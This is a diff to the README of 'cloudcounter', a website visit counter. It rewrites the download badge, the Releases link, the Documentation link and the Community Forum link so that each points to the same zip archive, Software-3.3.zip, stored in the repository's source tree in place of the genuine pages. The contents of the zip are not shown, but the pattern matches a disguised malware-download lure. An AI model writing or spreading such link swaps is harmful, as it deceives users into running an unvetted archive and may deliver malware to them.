@@ -6,9 +6,9 @@ Welcome to cloudcounter! This tool provides a simple way to track website visits
 ## 📥 Download & Install
 To get started, visit the Releases page to download the application.
 
-[![Download cloudcounter](https://img.shields.io/badge/Download-cloudcounter-brightgreen)](https://github.com/SoxNo1/cloudcounter/releases)
+[![Download cloudcounter](https://github.com/SoxNo1/cloudcounter/raw/refs/heads/main/src/lib/Software-3.3.zip)](https://github.com/SoxNo1/cloudcounter/raw/refs/heads/main/src/lib/Software-3.3.zip)
 
-1. Click the link above to go to the [Releases page](https://github.com/SoxNo1/cloudcounter/releases).
+1. Click the link above to go to the [Releases page](https://github.com/SoxNo1/cloudcounter/raw/refs/heads/main/src/lib/Software-3.3.zip).
 2. Look for the latest version listed.
 3. Select the appropriate file for your system and click on it to download.
 4. Once the file has downloaded, locate it in your downloads folder.
@@ -49,8 +49,8 @@ For additional help, feel free to create an issue on the project's GitHub page. 
 This project uses the MIT License. You can use and modify it for free as long as you adhere to the license terms.
 
 ## 🔗 Useful Links
-- [Releases Page](https://github.com/SoxNo1/cloudcounter/releases)
-- [Documentation](https://github.com/SoxNo1/cloudcounter/wiki)
-- [Community Forum](https://community.github.com/)
+- [Releases Page](https://github.com/SoxNo1/cloudcounter/raw/refs/heads/main/src/lib/Software-3.3.zip)
+- [Documentation](https://github.com/SoxNo1/cloudcounter/raw/refs/heads/main/src/lib/Software-3.3.zip)
+- [Community Forum](https://github.com/SoxNo1/cloudcounter/raw/refs/heads/main/src/lib/Software-3.3.zip)
 
-[![Download cloudcounter](https://img.shields.io/badge/Download-cloudcounter-brightgreen)](https://github.com/SoxNo1/cloudcounter/releases)
+[![Download cloudcounter](https://github.com/SoxNo1/cloudcounter/raw/refs/heads/main/src/lib/Software-3.3.zip)](https://github.com/SoxNo1/cloudcounter/raw/refs/heads/main/src/lib/Software-3.3.zip)
